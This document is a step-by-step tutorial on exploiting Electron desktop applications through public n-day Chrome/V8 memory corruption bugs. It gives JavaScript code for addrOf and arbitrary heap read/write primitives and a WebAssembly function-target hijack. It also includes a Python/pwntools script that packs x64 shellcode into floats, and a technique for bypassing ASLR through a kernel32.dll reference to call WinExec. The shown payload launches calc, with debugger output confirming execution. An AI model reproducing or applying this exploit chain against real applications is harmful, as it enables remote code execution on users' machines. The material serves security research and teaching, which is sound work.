<header>

# How to develop n-day chrome exploit for electron applications

Electron applications usually run an older version of chrome, this exposes them to exploits from public n-day chrome exploits.

</header>


## Finding chrome and v8 version 

This can be found by running the application with the argument ```–inspect={port}``` and ```–remote-debugging-port={port2}```, in chrome navigate to ```chrome://inspect``` and add the ports to discover network targets.
The first attaches node main process to a debugger, then by loading process module the information of v8 and other properties is obtained

![image](https://github.com/user-attachments/assets/4bf57ddd-9470-4da1-900a-b80ac7306ef3)

Some applications disable main process debug, in that case the second argument allows to debug a renderer process and find chrome version in the navigator object
 
![image](https://github.com/user-attachments/assets/5446298e-6e33-4744-819b-c42ef97b3a6f)

Once the chrome version is obtained it just a matter of finding a memory corruption for that version.

## Developing arbitrary read/write primitives
Once the initial memory corruption bug is found the process is standard, develop arbitrary read/write primitives.
One way is to have a float array with an object and a float array placed next to it. Corrupt the length of the first float array in order to modify the elements pointer of the object and the second float array, this allows to have both arrays point at the same memory address, allowing to read and write inside v8 heap.

Float arrays store data in  a literal way in memory, accessing element n of the array returns the literal value in memory of fl_arr[n]
![image](https://github.com/user-attachments/assets/3872852c-c685-4e2d-a854-f854dbfd5079)

On the other hand an object array contains an address to the object of reference 
![image](https://github.com/user-attachments/assets/4c740c74-94e8-4f3a-bcd3-a0e8028b9f50)

console.log(obj_arr[0]) returns the content of the address at obj_arr[0]

console.log(fl_arr[0]) returns the literal value in the memory of fl_arr[0]

This means that we can use the initial memory corruption to modity the elements pointer of fl_arr and obj_arr. 

Firs primitive addrOf

```javascript
data = ftoi(oob_arr[5]);
ori_fl_arr_elem = data & 0xffffffffn; 

function addrOf(o) {
    oob_arr[5] = itof((0x8n << 32n) | ori_victim_arr_elem);

    oob_arr[26] = itof((0x8n << 32n) | ori_victim_arr_elem);
    obj_arr[0] = o;

    return ftoi(fl_arr[0]) & 0xffffffffn;
}
```

If both arrays point at the same address, we can store an object in obj_arr[0], in memory obj_arr[0] will contain the address of the object. Then we can get it’s address by reading fl_arr[0], because fl_arr[0] is pointing at obj_arr[0], accesing fl_arr[0] returns the literal value in memory of obj_arr[0]

![image](https://github.com/user-attachments/assets/9457df1b-6887-461e-a3d8-d436176d5068)


Using the same method we can read  and write memory by assigning the address to fl_arr[0]

```javascript
function heap_read(addr) {

    oob_arr[5] = itof((0x8n << 32n) | (addr-0x8n));
    res = ftoi(fl_arr[0]);
    return res;

}
function heap_write(addr, val) {

    oob_arr[5] = itof((0x8n << 32n) | (addr-0x8n));
    fl_arr[0] = itof(val);
}
```

## Code execution in renderer process
First, we obtain a way to hijack the execution target of a function, this allows us to redirect code execution to an arbitrary address. This can be obtained by getting the Imported_function_target address of a WebAssembly module.
![image](https://github.com/user-attachments/assets/447944c9-4d32-4d47-9b5d-3d7908867bb3)

Inspect the memory address of the WebAssembly module, imported_function_target  is located at offset 0x30 (this differs depending on v8 version)

![image](https://github.com/user-attachments/assets/50058b01-f94a-457e-8afa-36b5da6b2bff)

imported_function_target  address contains the address of the RWX page
![image](https://github.com/user-attachments/assets/83599be4-505b-4ffc-81f9-682613d7655d)

Confirm RX permissions

![image](https://github.com/user-attachments/assets/01349ad2-0c8d-43eb-8ff3-fb08a7f3ad33)


Define a WASM with imported function, obtain imported_function_target  and replace it with arbitrary value
```javascript

const importObject = {
 imports: {imported_func : Math.sin},
};

var code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x00, 0x01, 0x7f, 0x02, 0x1b, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x08, 0x6a, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x33, 0x00, 0x00, 0x02, 0x6a, 0x73, 0x03, 0x74, 0x62, 0x6c, 0x01, 0x70, 0x00, 0x02, 0x03, 0x05, 0x04, 0x01, 0x01, 0x00, 0x00, 0x07, 0x10, 0x02, 0x06, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x32, 0x00, 0x03, 0x03, 0x70, 0x77, 0x6e, 0x00, 0x04, 0x09, 0x08, 0x01, 0x00, 0x41]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module, importObject);
var shellcode = instance.exports.func1;

var instance_addr = addrOf(instance);
var targets_ptr = (heap_read(instance_addr + 0x20n) & 0xffffffffn);
var target_rwx = targets_ptr + 0x8n;
var orignal_rwx_address = heap_read(target_rwx);
console.log('targets_ptr ' + ToHex(targets_ptr));
console.log('instance_addr ' + ToHex(instance_addr));
console.log('target_rwx ' + ToHex(target_rwx));
console.log('orignal_rwx_address ' + ToHex(orignal_rwx_address));

heap_write(target_rwx,0x42424242n);
shellcode();

```
Process crash confirms new address as target

![image](https://github.com/user-attachments/assets/2fd029fa-88ee-44a1-9ac6-7c34228d5f22)

## Insert shellcode in WebAssembly module

Now we need to find a way to inject shellcode. RWX memory pages have write protection, to bypass this shellcode is injected inside WebAssembly module, then look for the offset where shellcode starts and redirect the execution of the imported function.
To achieve this shellcode must be written as floating-point numbers, we must use the 8-byte structure commonly used for representing floating-point values to directly encode our shellcode instructions. By embedding these instructions within the V8 isolated heap memory in the form of ‘floating-number shaped shellcode’, they will be converted into the required shellcode assembly instructions inside the RWX memory page of the WASM module.
We’ll then have to link these encoded instructions together using short jump commands, creating a more reliable exploit strategy
To write assembly instructions as float will use pwntools and python to do the conversion, This method is taken from Matto Malvica explained here
https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-magle

### Writing shellcode as float
First, we will write our desired shellcode and convert it to float

Python code to convert shellcode https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418/

```python
sc = '''int3
	mov r15, [rsp+0x38]
	push 0x5D7F236
	pop r14
	add r15, r14
        mov r13, [r15]   
	push 0x57D70
	pop r12
        add r13, r12
        push 0x68AD0
	push 0x0
	pop rcx
	push 0x636C6163
	pop rdx
	shl rcx, 0x20
	add rcx, rdx
	xor rdx, rdx
	push rcx
	mov rcx, rsp
	inc rdx
        call r13
'''

def packshellcode(sc, n):  # packs shellcode into n-byte blocks
	ret = []
	cur = b""
	for line in sc.splitlines():
		k = asm(line)
		print("line {} ---- asm {} ---- len {}".format(line,k,len(k)))
		assert(len(k) <= n)
		if (len(cur) + len(k) <= n):
			cur += k
		else:
			ret += [cur.ljust(6,b"\x90")] # pad with NOPs
			cur = k
			
	ret += [cur.ljust(6,b"\x90")]
	return ret

SC = packshellcode(sc, 6)

# Ensure no repeat of 6 byte blocks
#D = dict(zip(SC, [SC.count(x) for x in SC]));
#assert(max(D.values()) == 1)

jmp = b'\xeb'


jump_len = [b'\x07']*len(SC)
for i in range(7,len(SC)):
	jump_len[i] = b'\x0c'
print(jump_len)
# After 16 jumps the instruction size of the vmovsd becomes 7 bytes from 4 bytes
# (4 bytes used instead of 1 byte to represent immediate larger than 0x7f)
#jump_len[4:] = [b'\x09'] * len(jump_len[4:]) 

SC = [(x + jmp + y) for x,y in zip(SC, jump_len)] # add jumps after each 6 byte block

SC = [struct.unpack('<d', x)[0] for x in SC] # represent as doubles

float1 = ''
drop = 0
for i in SC:
    drop += 1
    float1 += "f64.const {}\r\n".format(i)
    #print("f64.const {}".format(i))
for i in range(1,drop):
	if ( i == drop-1):
		print('aaa')
		float1 += "drop"
	else:
		float1 += "drop\r\n"

print(float1)
```
![image](https://github.com/user-attachments/assets/2de89476-2348-49a8-ab0b-1e295afa9915)

Next we will write the output of shellcode.py as .wat file 
Test.wat

![image](https://github.com/user-attachments/assets/c1fb21b0-83be-426a-870f-d3d4c9579eaf)

Convert it to Uint8Array
```bash
wat2wasm "test.wat" -o /tmp/ex.wasm
xxd -i /tmp/ex.wasm | grep 0x | tr -d \\n
```

![image](https://github.com/user-attachments/assets/0f4bc0ab-cab5-48a8-8b4c-127ec8e4206c)

Output is the hex value of test.wat, this is used as the Uint8Array to generate WASM with our shellcode
![image](https://github.com/user-attachments/assets/36d1b9e4-53a8-4e7f-881a-a0e255529493)

## Find shellcode offset inside WASM rwx memory page

Once we have our shellcode as float inside the WebAssembly module we can find the offset in the debugger.
The RWX address if at offset 0x48 from the WASM module (this might differ from different v8 versions, the offset can be found debugging d8)
At addrof(wasm) + 0x48 we have the RWX address, then look for the shellcode offset by inspecting memory from RWX address looking for the first ```mov r10``` instruction.
Inspect the RWX address

![image](https://github.com/user-attachments/assets/379427aa-bfaa-48dd-99b5-da7838e34fda)

Inspect the jmp instruction address

![image](https://github.com/user-attachments/assets/2e60ad81-75f6-40b2-ad5f-a128d130bf25)

The first mov r10 instruction is at address 0x21ea4a1c1b58, the offset is ```address of mov r10``` – ```RWX address```
0x21ea4a1c1b58 - 0x21ea4a1c1000 = 0xb58
Shellcode offset  = 0xb58 + 2n

```javascript
var instance_addr_0 = addrOf(wasm_instance_0);
var rwx_0 = heap_read64(instance_addr_0 + 0x48n);
var shellcode_0 = rwx_0 + 0xb58n +2n;

console.log('instance_addr_0 ' + ToHex(instance_addr_0));
console.log('rwx_0 ' + ToHex(rwx_0));
console.log('shellcode_0 ' + ToHex(shellcode_0));
heap_write64(target_rwx, shellcode_0);
```

## Evade ASLR

The last step is to evade ASLR , get kernel32.dll address and execute our code through winexec.
Testing across multiple electron applications, setting a breakpoint as the first assembly instruction I found that there is a memory address at RSP+0x38 which is at a fixed offset from a reference to a kernel32.dll address.

The electron application binary has many exported functions, one of them is called ``uv_spawn``.
Exported functions address in memory can be found by getting the offset from the binary memory dump in windows or using nm –demangle in linux

![image](https://github.com/user-attachments/assets/143f5310-8e18-428c-a750-ed988753d457)

What we need here is the second column, that is offset of the function.
In windbg the base address of the application can be obtained with !PEB command 
![image](https://github.com/user-attachments/assets/4e5bfd8c-1991-4360-b4e9-8b417bfaffa7)

Now we can inspect the code of any function by inspecting the address app_base + function offset, for example the function uv_spawn is located at 
7ff6147f0000 + 0x229c1e0. The offsets differ depending on the application binary.
Looking into the function uv_spawn, at offset 0x184 is the following assembly instruction.
Inspecting uv_spawn + 0x184
![image](https://github.com/user-attachments/assets/2cff9684-8875-4051-9c3d-f302a4cd2deb)

Inspecting the call instruction address

![image](https://github.com/user-attachments/assets/85ea9d3b-2760-42c6-bd1f-4a48726f511b)

Inspecting the first address of the call instruction address

![image](https://github.com/user-attachments/assets/9a5bf948-f4fe-4de6-b078-bfccc18c8493)

As seen in the screenshots, the first address uv_spawn + 0x184 contains an assembly instruction which calls the address contained in 0x7FF61E6D00C0, the content of this address is the address of a kernel32 function, KERNEL32_MultiByteToWideCharStub
There is a reference to an external module (kernel32.dll) from memory we can control
uv_spawn + 0x184 = KERNEL32_MultiByteToWideCharStub
This information is consistent across every electron application so it can be used to leak kernel32.dll and get access to winexec.

As mentioned initially, when our shellcode is executed we can set a breakpoint as the first instruction and inspect the stack.

Breakpoint hit first assembly instruction

![image](https://github.com/user-attachments/assets/146c9bfe-c1a2-4ee2-b79e-45ca475ef6a3)

At RSP + 0x38 there is an address at a fixed offset from the reference to kernel32.dll previously found.

uv_spawn + 0x184 assembly instruction address –  address at RSP + 0x38 
0x7FF61E6D00C0 – 0x7FF618950E8A = 0x5D7F236
Connecting the kernel reference from uv_spawn and the fixed memory value in the stack at RSP + 0x38 we can craft reliable shellcode to access kernel32.dll -> winexec and run our exploit

```assembly
	mov r15, [rsp+0x38]
	push 0x5D7F236
	pop r14
	add r15, r14
        mov r13, [r15]   
	push 0x57D70
	pop r12
        add r13, r12
```
First get the content of rsp + 0x38
push the offset to KERNEL32_MultiByteToWideCharStub
Add the offset and store the content of r15 (address of KERNEL32_MultiByteToWideCharStub ) in r13
Push the offset of KERNEL32_WinExec and add it to r13
r13 contains the address of KERNEL32_WinExec

The rest of the shellcode is to push the arguments of winexec (calc and 1)
```python
sc = '''int3
	mov r15, [rsp+0x38]
	push 0x5D7F236
	pop r14
	add r15, r14
        mov r13, [r15]   
	push 0x57D70
	pop r12
        add r13, r12
	push 0x0
	pop rcx
	push 0x636C6163
	pop rdx
	shl rcx, 0x20
	add rcx, rdx
	xor rdx, rdx
	push rcx
	mov rcx, rsp
	inc rdx
        call r13
'''

## Shellcode execution

This doesn't include a sandbox escape, it is common for electron application to run with --no-sandbox.

We can verify through windbg the execution of our code.

![image](https://github.com/user-attachments/assets/c0b0d31e-2c89-42c9-bba9-382579e8d6ea)

Running the poc we see the breakpoint as our first instruction and the next instruction matches our shellcode

![image](https://github.com/user-attachments/assets/672c5b7b-9d9b-49d4-9ffa-0afac98e8d83)

Stepping into the following instructions the blanks are filled with nops and the reference to kernel32 is obtained.

![image](https://github.com/user-attachments/assets/52358c47-9cc6-4cf1-8540-8cc5d52b91f2)

The arguments for WinExec are pushed onto the stack, then WinExec address is called

![image](https://github.com/user-attachments/assets/fa5fe492-ad02-494d-95c3-506a7d17b68c)

We have successfully executed shellcode in an electron application using a chrome n-day memory corruption.

![image](https://github.com/user-attachments/assets/5ca9af92-a42b-4345-a66b-8afcaf02da3d)
